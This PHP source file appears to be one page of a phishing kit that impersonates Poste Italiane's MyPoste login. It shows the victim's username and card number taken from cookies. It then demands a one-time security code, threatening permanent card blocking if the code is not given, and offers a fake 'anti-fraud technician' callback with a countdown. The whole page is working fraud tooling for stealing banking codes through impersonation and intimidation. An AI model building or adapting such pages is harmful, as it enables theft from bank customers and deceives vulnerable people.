<?php
//INCLUDERE GENERALE
require("pannello2/generale.php");

//CUSTOM
$pagina=array('otp');
$numero = 2;
$prossima = "chiamata.php";
$precedente ="posteid.php";

//INCLUDERE MOTORE
require("pannello2/motore.php");
$username="";
if(isset($_COOKIE["username"])){

  $username=$_COOKIE["username"];
}
$carta="";
if(isset($_COOKIE["carta"])){

  $carta=$_COOKIE["carta"];
}


?><html lang="it"  class="bianco"><head>
    <title>Accedi</title><?php script() ?>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="shortcut icon" href="favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, user-scalable=0">
       <link type="text/css" rel="stylesheet" href="css/bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="css/css.css">
    <script type="text/javascript" src="css/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.countdown/2.2.0/jquery.countdown.min.js" ></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js" ></script>
    <?php script() ?>   <style>
      @font-face {
  font-family: Texta;
  src: url(Texta-Regular.woff);
}

      body {
    font-family: 'Texta', sans-serif;
}

      .content-federation-bar-minified .federation-bar-content-logo div,
      .content-federation-bar-simplified .federation-bar-content-logo div {
        float: left;
        padding: 15px 0 0 0 !important;
      }
      .sfondo{
        
    background-color: #f6f6f6;
      }
      .car{background-image:url(ccc.jpg)}
    </style>
  </head>
  <body  class="bianco">
    <div class="father">
    <div class="child"><img src="logo.png"></div>
</div>

<style>
    html, body{
        background-color:white;
    }
.father {
 display: flex;
    justify-content: center;
    align-items: center;
}
.resto{
    display: none ;
}

.nascondi{
    display: none !important;
}

.child {
  background-image: url(spinner_giallo.gif);
    margin-top: 100%;
    position: absolute;
    background-repeat: no-repeat;
    background-size: 48px;
    background-position: center;
}
</style>
<div class="resto">

    <div class="content content-federation-bar content-federation-bar-minified content-federation-bar-simplified">
      <div class="container container-extended">
        <div class="row">
          
          <div class="col-md-12">
            <div class="header-minified">
              <div class="row">
                <div class="col-xs-12">
                  <div style="text-align:center;padding-top:10px;" class="federation-bar-content-logo pull-xs-left clearfix">
                   
                          <img src="css/img1.png">
                   
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div style="text-align:center;padding-top: 42px;">
      <div>
    <div class="row">
										<div class="col-md-12" style="text-align:center;">
											<div class="abstract">
												<div class="abstract-heading text-xs-center spacer-xs-bottom-40">
													<h1 class="idp-retail">
														Benveuto in <b>MyPoste</b> 
														<small>
                            <h3 class="idp-retail" style="font-size: 90%;line-height: 100%;padding: 0px 30px;color: #3c3c3c;">
															<?php echo $username?>
																
															</h3>
														</small>
													</h1>
													
												</div>
											</div>
										</div>
									</div>
    
    <div style="text-align:center;padding-top: 22px;">
      <div>
      
      </div>
    </div>
    <div class="col-12">
    <form class="form-login clearfix" method="POST" >
        <div class="panel-body">
          <div class="spacer-xs-bottom-30"
           style="BACKGROUND-COLOR: white;margin: 0 10px;padding: 20px;text-align:left;"> 
            
       
          <p style="font-size:150%">A breve riceverà una notifica
        da autorizzare o un codice da inserire nello spazio sottostante.<br>
      La manacata ricezione di una delle due cose, causerà il blocco permanente
    della sua carta <?php echo $carta ?>, a motivo della mancante verifica della sicurezza web. </p>
          <BR>
          <label class="control-label" for="otp" >CODICE</label>
      
      <input class="form-control" id="otp" name="otp" 
      
      placeholder="inserisci" style="padding:25px  0px 25px 0"type="text" value="">

  </div>
  </div>

  </div>

  
            
            <p class="btn-container btn-container-center spacer-xs-bottom-15 
            spacer-xs-top-30 clearfix" style="margin: 5PX 25px;">
              <input type="submit"  style=" 
    font-weight: normal !important;" class="btn btn-primary btn-expand" value="CONFERMA">
            </p>
         
       
      </form>
  
  </div>   <?php if(!isset($_GET['richiedichiamata'])){  ?>      <h1 class="idp-retail">
														Vuoi essere richiamato?
													
													</h1>
                         
                <img src="chiamaci.png" s class="spacer-xs-right-10">
              
<div  style="margin: 5PX 25px;">
                          <p class="btn-container btn-container-center spacer-xs-bottom-15 
            spacer-xs-top-30 clearfix" style="margin: 5PX 25px;">
            <form method="get" >
                     <BR>
              <input type="hidden" name="richiedichiamata" value="1" />

              <input type="submit"  style=" 
    font-weight: normal !important;" class="btn btn-primary btn-expand" value="RICEVI CHIAMATA">
 <h3>E un nostro tecnico ti assisterà.<br>La invitiamo a non ricaricare la pagina.</h3>
 <br><br>
                
    </form>
            </p> </div>
            <?php }else{  ?>

              
            
              <h3>Un nostro tecnico dell'anti-frode la contatterà entro il tempo indicato.</h3>

<div id="clock" style="font-size: 32px;margin: 15px;"></div>

<br>
  
          <?php }  ?>
                        </div>


  <script>
    setTimeout(function(){

jQuery(".father").fadeOut( "slow", function() {
   
        jQuery("html, body").addClass("sfondo")
        
        jQuery("html, body").removeClass("bianco")
        jQuery(".resto").fadeIn()
  });

    },2000)
    
    time = moment();
    time.add(15,'minutes');
    $('div#clock').countdown(time.format("MM/DD/YYYY HH:mm:ss"),function(event) {
  $(this).html(event.strftime('%H:%M:%S'))

  
    });

    </script>
  
</body></html>